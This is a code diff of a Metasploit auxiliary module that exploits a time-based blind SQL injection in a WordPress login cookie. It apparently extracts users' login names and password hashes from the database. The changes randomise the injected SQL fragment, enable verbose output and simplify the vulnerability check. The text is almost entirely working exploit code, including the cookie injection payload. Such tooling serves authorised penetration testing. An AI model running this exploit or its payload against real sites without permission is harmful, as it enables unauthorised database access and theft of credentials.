@@ -6,7 +6,6 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::SQLi
   include Msf::Auxiliary::Scanner
-  include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
     super(
@@ -32,7 +31,7 @@ class MetasploitModule < Msf::Auxiliary
           ['List Data', { 'Description' => 'Queries database schema for COUNT rows' }]
         ],
         'DefaultAction' => 'List Data',
-        'DefaultOptions' => { 'SqliDelay' => '2' },
+        'DefaultOptions' => { 'SqliDelay' => '2', 'VERBOSE' => true },
         'DisclosureDate' => '2023-11-14',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
@@ -49,19 +48,20 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     print_status("Performing SQL injection via the 'wordpress_logged_in' cookie...")
 
-    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true, delay: 5 }) do |payload|
+    random_number = Rex::Text.rand_text_numeric(rand(4..8))
+    random_table = Rex::Text.rand_text_alpha(rand(4..8))
+    random_string = Rex::Text.rand_text_alpha(rand(4..8))
+
+    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
       res = send_request_cgi({
         'method' => 'GET',
-        'cookie' => "wordpress_logged_in=\" AND (SELECT 8859 FROM (SELECT(#{payload}))AvDn) AND \"nhxM\"=\"nhxM",
+        'cookie' => "wordpress_logged_in=\" AND (SELECT #{random_number} FROM (SELECT(#{payload}))#{random_table}) AND \"#{random_string}\"=\"#{random_string}",
         'uri' => normalize_uri(target_uri.path, 'wp-login.php')
       })
       fail_with Failure::Unreachable, 'Connection failed' unless res
     end
 
-    unless @sqli.test_vulnerable
-      print_bad("#{peer} - Testing of SQLi failed. If this is time-based, try increasing the SqliDelay.")
-      return
-    end
+    return print_bad("#{peer} - Testing of SQLi failed. If this is time-based, try increasing the SqliDelay.") unless @sqli.test_vulnerable
 
     columns = ['user_login', 'user_pass']
 
